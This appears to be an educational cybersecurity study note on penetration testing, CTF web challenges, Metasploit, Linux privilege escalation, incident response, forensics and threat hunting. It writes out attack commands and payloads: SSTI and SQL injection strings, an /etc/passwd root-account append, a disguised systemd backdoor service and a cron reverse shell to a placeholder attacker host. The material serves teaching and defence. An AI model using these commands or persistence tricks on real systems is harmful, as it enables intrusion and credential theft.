# 006_Red_Team_Blue_Team

> Penetration testing methodology, CTF challenges, and incident response.

## Level 1 — Intuition

### Concept

Red Team attacks. Blue Team defends. Purple Team makes them work together. In the real world, it's not a game — it's about finding weaknesses before real attackers do.

### Attack Lifecycle (Cyber Kill Chain)

```
1. Reconnaissance     →  2. Weaponization   →  3. Delivery
   "Who's the target?"    "Build the exploit"    "Send the phish"

4. Exploitation       →  5. Installation     →  6. Command & Control
   "Execute the attack"   "Install backdoor"     "Remote control"

7. Actions on Objective
   "Exfiltrate data, ransomware, destroy"
```

## Level 2 — Practical

### Penetration Testing Methodology

```bash
# Phase 1: Reconnaissance (Passive)
whois target.com
dig target.com ANY
theHarvester -d target.com -b google,linkedin
# → Emails, subdomains, employee names

# Phase 2: Scanning (Active)
nmap -sV -sC -O target.com
nmap --script vuln target.com
# → Open ports, services, potential vulnerabilities

# Phase 3: Enumeration
gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt
ffuf -u https://FUZZ.target.com -w subdomains.txt
nikto -h https://target.com
# → Hidden directories, subdomains, misconfigurations

# Phase 4: Exploitation
# Use found vulnerability (e.g., metasploit, manual exploit)
searchsploit "Apache 2.4"           # Find known exploits
msfconsole                          # Metasploit framework

# Phase 5: Post-Exploitation
# If you get a shell:
whoami && id && uname -a            # Situational awareness
cat /etc/passwd                     # Users
sudo -l                             # Sudo permissions
find / -perm -4000 2>/dev/null      # SUID binaries
ps aux                              # Running processes
# Download linpeas.sh for automated enumeration

# Phase 6: Reporting
# Write report with:
# - Executive summary (non-technical)
# - Methodology
# - Findings (severity: Critical → Low)
# - Proof of concept (screenshots)
# - Remediation recommendations
```

### CTF (Capture The Flag) Types

```
Jeopardy-style:
┌──────────┬──────────┬──────────┐
│  Web 100 │ Crypto200│  Pwn 300 │  ← Points = difficulty
├──────────┼──────────┼──────────┤
│ Rev 150  │  Misc 50 │ Foren400 │
└──────────┴──────────┴──────────┘
Categories: Web, Crypto, Reverse, Pwn (binary exploit), Forensics, Misc

Attack-Defense:
- Each team has vulnerable services
- Attack others' services (capture flags)
- Defend your own (patch vulnerabilities)
- Simultaneous offense + defense
```

### Common CTF Web Challenge Patterns

```python
# Pattern 1: Loose comparison (PHP/type juggling)
# Input that bypasses: if ($_GET['password'] == "secret")
# ?password=0  →  0 == "secret" → true in PHP! (0 is falsy)

# Pattern 2: SSTI (Server-Side Template Injection)
# Jinja2: {{ 7*7 }}  →  renders as 49? Template is vulnerable
# {{ config.items() }}  →  leaks Flask config
# {{ ''.__class__.__mro__[2].__subclasses__() }}  → RCE

# Pattern 3: SQL Injection (see 004_Web_Security)
# admin' --   or   1' OR '1'='1

# Pattern 4: Path traversal
# http://site.com/view?file=../../../etc/passwd
# Defense: sanitize, whitelist, chroot

# Pattern 5: JWT none algorithm
# Change header: {"alg": "none"} → accept without verification
# Defense: whitelist algorithms on server
```

## Level 3 — Systems

### Metasploit Basics

```bash
# Start Metasploit
msfconsole

# Search for exploits
search apache 2.4
search type:exploit platform:linux

# Select and configure
use exploit/multi/http/struts2_code_exec
show options
set RHOSTS 192.168.1.100
set RPORT 8080
set LHOST 10.0.0.5          # Your IP for reverse shell
set LPORT 4444
set TARGET 0

# Check if target is vulnerable
check

# Run exploit
exploit
# If successful → meterpreter shell

# Meterpreter commands
sysinfo                       # System info
getuid                        # Current user
shell                         # Drop to system shell
upload /local/file /remote/   # Upload file
download /remote/file /local/ # Download file
hashdump                      # Dump password hashes
screenshot                    # Take screenshot
```

### Privilege Escalation (Linux)

```bash
# Checklist for Linux privesc:

# 1. Kernel version (exploit-db lookup)
uname -a

# 2. Sudo permissions
sudo -l
# If (ALL) NOPASSWD: /usr/bin/vim → sudo vim -c '!bash'

# 3. SUID binaries
find / -perm -4000 -type f 2>/dev/null
# Look for: find, vim, bash, less, python → GTFOBins lookup

# 4. Writable /etc/passwd
ls -la /etc/passwd
# If writable: echo "root2::0:0:root:/root:/bin/bash" >> /etc/passwd

# 5. Cron jobs
cat /etc/crontab
ls -la /etc/cron.*
# Writable script called by root? → Add reverse shell

# 6. Capabilities
getcap -r / 2>/dev/null
# cap_setuid+ep python → python -c 'import os; os.setuid(0); os.system("bash")'

# 7. Credentials in files
grep -ri "password" /var/www/ 2>/dev/null
find / -name "*.bak" 2>/dev/null
cat ~/.bash_history
```

### Incident Response (Blue Team)

```
Incident Response Phases:
┌─────────────────────────────────────────────────────────┐
│ 1. PREPARATION — Have a plan, tools ready, contacts    │
│                                                         │
│ 2. IDENTIFICATION — Detect the incident                 │
│    Alerts? User reports? Anomalous logs?                │
│    "Is this a real incident or a false positive?"       │
│                                                         │
│ 3. CONTAINMENT — Stop the bleeding                      │
│    Isolate affected systems (network segmentation)      │
│    Disable compromised accounts                         │
│    DON'T shut down (preserves volatile evidence)        │
│                                                         │
│ 4. ERADICATION — Remove the threat                      │
│    Remove malware, close backdoors, patch vulnerability │
│                                                         │
│ 5. RECOVERY — Return to normal                          │
│    Restore from clean backup, monitor closely           │
│                                                         │
│ 6. LESSONS LEARNED — Never again                        │
│    Postmortem: What happened? Why? How to prevent?      │
└─────────────────────────────────────────────────────────┘
```

### Forensics Data Collection

```bash
# Memory dump (volatile data first!)
sudo dd if=/dev/fmem of=memory.dump   # Linux
# or: sudo fmem -o memory.dump

# Running processes
ps auxf > processes.txt
netstat -tunap > connections.txt

# User activity
last > logins.txt
w > current_users.txt
cat /var/log/auth.log > auth_log.txt

# Filesystem timeline
find / -type f -mtime -7 -ls > recent_files.txt

# Suspicious files
find / -name "*.php" -mtime -1 2>/dev/null  # New PHP files
find / -perm -o+w -type f 2>/dev/null       # World-writable
```

## Level 4 — Expert

### Advanced Persistence

```bash
# Attackers maintain access through:

# 1. SSH authorized keys
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys

# 2. Cron job reverse shell
# (crontab -e)
# */5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'

# 3. Systemd service
cat > /etc/systemd/system/legit-looking.service << 'EOF'
[Unit]
Description=System logging service
[Service]
ExecStart=/usr/lib/systemd/.hidden/backdoor
Restart=always
[Install]
WantedBy=multi-user.target
EOF
systemctl enable legit-looking.service

# 4. Rootkit (kernel module)
# Hides files, processes, network connections from user-space tools

# Detection:
# - File integrity monitoring (AIDE, Tripwire)
# - Compare /proc/modules vs lsmod
# - Check for hidden processes: ps aux vs /proc/*/cmdline count
# - Network: check raw sockets (ss -ap | grep raw)
```

### Threat Hunting

```python
# Threat hunting: proactively search for indicators of compromise
# Assume breach → find it before alert fires

# Hunt hypotheses:
# 1. "Powershell downloading from external IP"
# 2. "New service installed on domain controller"
# 3. "Unusual outbound traffic on port 443 at 3 AM"
# 4. "User logged in from two countries simultaneously"

# Example: hunt for beaconing (C2 communication patterns)
def detect_beaconing(connections, interval_window=300, jitter=0.05):
    """
    C2 beacons often have regular intervals with slight jitter.
    interval_window: check for connections every ~5 minutes
    jitter: acceptable variance (5%)
    """
    for ip, conns in connections.items():
        if len(conns) < 5:
            continue
        intervals = [conns[i+1].time - conns[i].time
                     for i in range(len(conns)-1)]
        avg = sum(intervals) / len(intervals)
        # Check if intervals are suspiciously regular
        variance = sum((t - avg)**2 for t in intervals) / len(intervals)
        if variance < (avg * jitter)**2:
            print(f"SUSPICIOUS: {ip} — beaconing every {avg:.1f}s")
```

---

## Exercises

1. Complete a beginner CTF challenge from overthewire.org (Bandit) or picoCTF. Document your thought process for each step.
2. Set up a vulnerable VM (Metasploitable or DVWA). Run nmap against it, enumerate services, and exploit one vulnerability (e.g., vsftpd 2.3.4 backdoor).
3. Write an incident response checklist for a web server compromise. Include: first 5 commands to run, evidence preservation order, and communication template.

## Quiz

1. What are the 7 stages of the Cyber Kill Chain?
2. What's the difference between a red team and a penetration test?
3. Name three common Linux privilege escalation vectors.
4. What is the purpose of the containment phase in incident response?
5. What is beaconing and why is it a red flag?

---

## Navigation

**Parent**: [[000_CYBERSECURITY_MOC|CYBERSECURITY]]

**Synapses**:
- [[001_Threat_Modeling|CYBERSECURITY 001]] — Threat modeling
- [[003_Network_Security|CYBERSECURITY 003]] — Network attacks
- [[004_Web_Security|CYBERSECURITY 004]] — Web exploitation
